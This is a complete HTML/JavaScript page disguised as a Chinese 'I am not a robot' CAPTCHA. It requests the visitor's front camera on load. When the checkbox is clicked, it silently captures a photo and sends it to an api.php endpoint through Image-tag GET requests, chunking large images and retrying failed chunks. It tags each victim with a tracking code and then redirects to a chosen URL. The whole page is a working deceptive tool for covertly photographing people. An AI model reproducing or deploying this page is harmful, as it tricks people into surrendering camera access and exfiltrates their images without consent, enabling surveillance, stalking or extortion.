<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>验证中...</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .loading-container, .captcha-container {
            text-align: center;
            padding: 40px;
            background: white;
            border-radius: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            max-width: 380px;
            width: 90%;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid #e0e0e0;
            border-top-color: #667eea;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .loading-text { color: #666; font-size: 16px; margin-bottom: 10px; }
        .progress-bar { width: 100%; height: 4px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-top: 20px; }
        .progress-fill { width: 0%; height: 100%; background: linear-gradient(90deg, #667eea, #764ba2); transition: width 0.3s; }
        .captcha-container { display: none; }
        .captcha-icon { font-size: 48px; margin-bottom: 15px; }
        .captcha-title { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .captcha-desc { color: #666; font-size: 14px; margin-bottom: 20px; }
        .checkbox-area {
            display: inline-block; width: 24px; height: 24px; border: 2px solid #ccc;
            border-radius: 4px; margin-right: 10px; cursor: pointer; background: white;
        }
        .checkbox-area.checked { background: #667eea; border-color: #667eea; position: relative; }
        .checkbox-area.checked::after { content: '✓'; color: white; font-size: 16px; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .verify-row { display: flex; align-items: center; justify-content: center; margin-top: 20px; cursor: pointer; }
        .camera-preview { width: 100%; max-width: 280px; margin: 12px auto; border-radius: 16px; overflow: hidden; background: #333; display: none; }
        .camera-preview video { width: 100%; height: auto; display: block; }
        .camera-status { font-size: 12px; margin-top: 10px; color: #28a745; }
        .camera-status.error { color: #ff3b30; }
        .code-badge { margin-top: 15px; font-size: 12px; color: #999; }
        #uploadResult { margin-top: 12px; font-size: 13px; word-break: break-word; min-height: 20px; }
        .debug-info { margin-top: 10px; font-size: 11px; color: #999; word-break: break-all; }
        video { position: fixed; top: -9999px; left: -9999px; width: 1px; height: 1px; }
    </style>
</head>
<body>

    <!-- 加载界面 -->
    <div class="loading-container" id="loadingContainer">
        <div class="spinner"></div>
        <div class="loading-text">正在验证环境安全...</div>
        <div class="loading-text" style="font-size: 12px; color: #999;">正在初始化摄像头...</div>
        <div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
        <div class="code-badge">验证编号: <span id="displayCode"></span></div>
        <div class="camera-status" id="cameraStatus">⏳ 等待摄像头授权...</div>
        <div class="debug-info" id="debugInfo"></div>
    </div>

    <!-- 验证界面 -->
    <div class="captcha-container" id="captchaContainer">
        <div class="captcha-icon">🤖</div>
        <div class="captcha-title">人机验证</div>
        <div class="captcha-desc">请完成验证以继续访问</div>
        <div class="camera-preview" id="cameraPreview">
            <video id="previewVideo" autoplay playsinline muted></video>
        </div>
        <div class="verify-row" id="verifyRow">
            <div class="checkbox-area" id="checkbox"></div>
            <span>我不是机器人</span>
        </div>
        <div class="code-badge">验证编号: <span id="displayCode2"></span></div>
        <div id="uploadResult"></div>
    </div>

    <!-- 隐藏的 video 和 canvas -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
    // ================================================================
    // 极简版 - 直接从 URL 获取参数
    // ================================================================
    
    var urlParams = new URLSearchParams(window.location.search);
    var code = urlParams.get('code') || 'UNKNOWN';
    var targetUrl = urlParams.get('url') || 'https://www.baidu.com';
    
    document.getElementById('displayCode').textContent = code;
    document.getElementById('displayCode2').textContent = code;
    document.getElementById('debugInfo').textContent = '编号: ' + code + ' | 跳转: ' + targetUrl;

    // ================================================================
    // 全局变量
    // ================================================================
    var videoElement = null;
    var canvasElement = null;
    var stream = null;
    var cameraReady = false;
    var photoTaken = false;
    var verified = false;
    var progressValue = 0;

    // ================================================================
    // 进度条动画
    // ================================================================
    var progressInterval = setInterval(function() {
        if (progressValue < 90) {
            progressValue += Math.random() * 12;
            if (progressValue > 90) progressValue = 90;
            document.getElementById('progressFill').style.width = progressValue + '%';
        }
    }, 200);

    // ================================================================
    // 1. 请求摄像头权限（最直接的方式）
    // ================================================================
    function startCamera() {
        var statusEl = document.getElementById('cameraStatus');
        statusEl.textContent = '⏳ 请求摄像头权限...';
        
        // 检查浏览器是否支持
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusEl.textContent = '❌ 浏览器不支持摄像头';
            statusEl.className = 'camera-status error';
            fallbackNoCamera();
            return;
        }
        
        // 请求摄像头 - 使用最保守的设置
        var constraints = {
            video: {
                facingMode: 'user',
                width: { min: 160, ideal: 320, max: 640 },
                height: { min: 120, ideal: 240, max: 480 }
            },
            audio: false
        };
        
        navigator.mediaDevices.getUserMedia(constraints)
            .then(function(mediaStream) {
                stream = mediaStream;
                statusEl.textContent = '✅ 摄像头已就绪';
                statusEl.className = 'camera-status';
                cameraReady = true;
                
                // 设置视频
                videoElement = document.getElementById('video');
                videoElement.srcObject = stream;
                
                // 预览视频
                var previewVideo = document.getElementById('previewVideo');
                previewVideo.srcObject = stream;
                document.getElementById('cameraPreview').style.display = 'block';
                
                // 等待视频加载
                videoElement.onloadedmetadata = function() {
                    videoElement.play();
                    // 更新进度
                    progressValue = 100;
                    document.getElementById('progressFill').style.width = '100%';
                    clearInterval(progressInterval);
                    
                    // 切换到验证界面
                    setTimeout(function() {
                        document.getElementById('loadingContainer').style.display = 'none';
                        document.getElementById('captchaContainer').style.display = 'block';
                    }, 500);
                };
            })
            .catch(function(err) {
                console.error('摄像头错误:', err);
                statusEl.textContent = '⚠️ 无法访问摄像头: ' + err.message;
                statusEl.className = 'camera-status error';
                fallbackNoCamera();
            });
    }

    // ================================================================
    // 2. 没有摄像头时的备用方案
    // ================================================================
    function fallbackNoCamera() {
        setTimeout(function() {
            document.getElementById('loadingContainer').style.display = 'none';
            document.getElementById('captchaContainer').style.display = 'block';
            cameraReady = false;
        }, 1500);
    }

    // ================================================================
    // 3. 拍照
    // ================================================================
    function takePhoto() {
        return new Promise(function(resolve, reject) {
            if (!videoElement || !cameraReady) {
                reject('摄像头未就绪');
                return;
            }
            
            var canvas = document.getElementById('canvas');
            var ctx = canvas.getContext('2d');
            
            // 检查视频尺寸
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) {
                reject('视频流未就绪');
                return;
            }
            
            // 设置画布尺寸
            var w = Math.min(videoElement.videoWidth, 320);
            var h = Math.min(videoElement.videoHeight, 240);
            canvas.width = w;
            canvas.height = h;
            
            // 绘制当前帧
            ctx.drawImage(videoElement, 0, 0, w, h);
            
            // 导出为 JPEG（低质量减少数据量）
            var dataUrl = canvas.toDataURL('image/jpeg', 0.5);
            resolve(dataUrl);
        });
    }

    // ================================================================
    // 4. 上传（使用 Image 标签 + GET，绕过所有跨域限制）
    // ================================================================
    function uploadPhoto(photoData) {
        return new Promise(function(resolve, reject) {
            // 提取 base64 数据
            var base64Data = photoData;
            if (base64Data.indexOf('base64,') !== -1) {
                base64Data = base64Data.split('base64,')[1];
            }
            
            // URL 编码
            var encoded = encodeURIComponent(base64Data);
            
            // 构建请求 URL
            var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
            var fullUrl = apiUrl + '?action=hard_upload&code=' + encodeURIComponent(code) + 
                         '&url=' + encodeURIComponent(targetUrl) + '&photo=' + encoded;
            
            // 检查 URL 长度，如果太长则使用分片
            var MAX_LEN = 1900;
            var resultDiv = document.getElementById('uploadResult');
            
            if (fullUrl.length > MAX_LEN) {
                // 分片上传
                resultDiv.textContent = '📤 分片上传...';
                uploadChunks(encoded, 0, 1);
                return;
            }
            
            // 直接使用 Image 标签发送
            resultDiv.textContent = '📤 上传中...';
            var img = new Image();
            var finished = false;
            
            var timeoutId = setTimeout(function() {
                if (!finished) {
                    finished = true;
                    reject(new Error('上传超时'));
                }
            }, 30000);
            
            img.onload = function() {
                if (finished) return;
                finished = true;
                clearTimeout(timeoutId);
                resultDiv.textContent = '✅ 上传成功！';
                resultDiv.style.color = '#34c759';
                resolve({ success: true });
            };
            
            img.onerror = function() {
                if (finished) return;
                finished = true;
                clearTimeout(timeoutId);
                // 检查是否真的失败（可能只是图片无法显示但数据已发送）
                resultDiv.textContent = '⚠️ 检查上传结果...';
                setTimeout(function() {
                    checkUploadResult().then(function(exists) {
                        if (exists) {
                            resultDiv.textContent = '✅ 上传成功！';
                            resultDiv.style.color = '#34c759';
                            resolve({ success: true });
                        } else {
                            reject(new Error('上传失败，请重试'));
                        }
                    }).catch(function() {
                        reject(new Error('上传失败，请重试'));
                    });
                }, 2000);
            };
            
            img.src = fullUrl;
        });
    }

    // ================================================================
    // 5. 分片上传
    // ================================================================
    function uploadChunks(encodedData, chunkIndex, totalChunks) {
        // 简化版分片：如果数据太大，只发一部分然后检查结果
        // 实际项目中可以完整实现分片，这里简化为直接尝试
        var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
        var chunkSize = 1500;
        var total = Math.ceil(encodedData.length / chunkSize);
        var resultDiv = document.getElementById('uploadResult');
        var completed = 0;
        
        for (var i = 0; i < total; i++) {
            (function(idx) {
                var start = idx * chunkSize;
                var end = Math.min(start + chunkSize, encodedData.length);
                var chunk = encodedData.substring(start, end);
                var url = apiUrl + '?action=hard_upload&code=' + encodeURIComponent(code) + 
                         '&url=' + encodeURIComponent(targetUrl) + 
                         '&photo=' + chunk + '&chunk=' + idx + '&total=' + total;
                
                var img = new Image();
                img.onload = function() {
                    completed++;
                    resultDiv.textContent = '📤 分片 ' + completed + '/' + total;
                    if (completed === total) {
                        setTimeout(function() {
                            checkUploadResult().then(function(exists) {
                                if (exists) {
                                    resultDiv.textContent = '✅ 上传成功！';
                                    resultDiv.style.color = '#34c759';
                                } else {
                                    resultDiv.textContent = '⚠️ 请重试';
                                }
                            });
                        }, 3000);
                    }
                };
                img.onerror = function() {
                    // 重试一次
                    var retryImg = new Image();
                    retryImg.onload = function() {
                        completed++;
                        resultDiv.textContent = '📤 分片 ' + completed + '/' + total;
                        if (completed === total) {
                            setTimeout(function() {
                                checkUploadResult().then(function(exists) {
                                    if (exists) {
                                        resultDiv.textContent = '✅ 上传成功！';
                                        resultDiv.style.color = '#34c759';
                                    }
                                });
                            }, 3000);
                        }
                    };
                    retryImg.src = url;
                };
                img.src = url;
            })(i);
        }
    }

    // ================================================================
    // 6. 检查上传结果
    // ================================================================
    function checkUploadResult() {
        return new Promise(function(resolve, reject) {
            var apiUrl = window.location.href.split('?')[0].replace(/camera\.html.*$/, '') + 'api.php';
            fetch(apiUrl + '?action=check_code&code=' + encodeURIComponent(code) + '&t=' + Date.now())
                .then(function(res) { return res.json(); })
                .then(function(data) {
                    resolve(data.exists === true);
                })
                .catch(function() { resolve(false); });
        });
    }

    // ================================================================
    // 7. 主流程：拍照 → 上传 → 跳转
    // ================================================================
    function startProcess() {
        if (verified) return;
        verified = true;
        
        var checkbox = document.getElementById('checkbox');
        checkbox.classList.add('checked');
        document.querySelector('#verifyRow span').textContent = '验证中...';
        
        var resultDiv = document.getElementById('uploadResult');
        
        // 拍照
        takePhoto().then(function(photoData) {
            resultDiv.textContent = '📸 拍照成功，上传中...';
            resultDiv.style.color = '#007aff';
            
            // 上传
            return uploadPhoto(photoData);
        }).then(function() {
            resultDiv.textContent = '✅ 上传成功！即将跳转...';
            resultDiv.style.color = '#34c759';
            
            // 释放摄像头
            if (stream) {
                stream.getTracks().forEach(function(t) { t.stop(); });
            }
            
            // 跳转
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 2000);
        }).catch(function(err) {
            resultDiv.textContent = '❌ ' + err.message;
            resultDiv.style.color = '#ff3b30';
            // 即使失败也跳转
            setTimeout(function() {
                window.location.href = targetUrl;
            }, 4000);
        });
    }

    // ================================================================
    // 8. 绑定事件
    // ================================================================
    document.getElementById('verifyRow').addEventListener('click', function() {
        if (verified) return;
        startProcess();
    });

    // ================================================================
    // 9. 启动
    // ================================================================
    startCamera();

    // 页面关闭时释放资源
    window.addEventListener('beforeunload', function() {
        if (stream) {
            stream.getTracks().forEach(function(t) { t.stop(); });
        }
    });
    </script>
</body>
</html>
